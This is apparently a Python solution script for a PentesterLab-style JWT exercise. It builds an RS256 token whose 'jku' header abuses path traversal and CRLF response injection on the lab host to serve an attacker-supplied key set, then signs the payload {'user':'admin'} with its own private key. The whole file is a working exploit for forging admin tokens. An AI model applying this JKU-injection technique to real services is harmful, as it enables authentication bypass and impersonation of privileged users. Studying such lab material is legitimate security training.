import base64
import json
from OpenSSL.crypto import FILETYPE_PEM, load_privatekey
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

#Loading Private key from file.
with open('private_key.pem', 'rb') as f:
    private_key_data = f.read()
    private_key = load_privatekey(FILETYPE_PEM, private_key_data)
    private_key= private_key.to_cryptography_key()

#Header
header= {
            "typ": "JWT",
            "alg": "RS256",
            "jku": "http://ptl-b77a8d98-ad25e3bd.libcurl.so/.well-known/../debug?value=1337%0d%0aContent-Length:+444%0d%0a%0d%0a%7B%22keys%22%3A%20%5B%7B%22kty%22%3A%20%22RSA%22%2C%20%22use%22%3A%20%22sig%22%2C%20%22kid%22%3A%20%22pentesterlab%22%2C%20%22alg%22%3A%20%22RS256%22%2C%20%22n%22%3A%20%22APTVgs2jmy_I8CR3cBIqXyS73iNp9X9IP5oCWK_TPsYS9K5vhg-V59OTxMmBe5gN_Zn8BxgN2Jdv1HEVDhQvnNvikf6E7MkzAi-gsN9Ih9JCHM4elUXahvqu8NwkiN7bz9hkMdifUencSKZpHoVKM_RulnLBw-gWHpTzFmJKk9c4K894of-_OgxvMTtI64MoDevjDnv9rNWmanf7fuG8z7UTo490g8a_zTDzEwYO9FYneuiT0GGj3c23ehScF8uZAdzAq16QMXOpc58QLk5W0spMN-uJD7XbSGF8jsOmP5e5ULEijMc4DacNdQcKH6QGZQkw3YngB_AnFE-EKIp7VHk%22%2C%20%22e%22%3A%20%22AQAB%22%7D%5D%7D"
        }
# New Payload
payload= "eyJ1c2VyIjoiYWRtaW4ifQ"

# Header + payload
data= base64.urlsafe_b64encode(bytes(json.dumps(header),encoding='utf8')).decode('utf8').rstrip("=")+"."+payload

# Getting signature with private key
sig=private_key.sign(bytes(data,encoding="utf8"),algorithm=hashes.SHA256(),padding=padding.PKCS1v15())

# Printing new JWT Token with base64 encoded signature
print(data+"."+base64.urlsafe_b64encode(sig).decode("utf8").rstrip("="))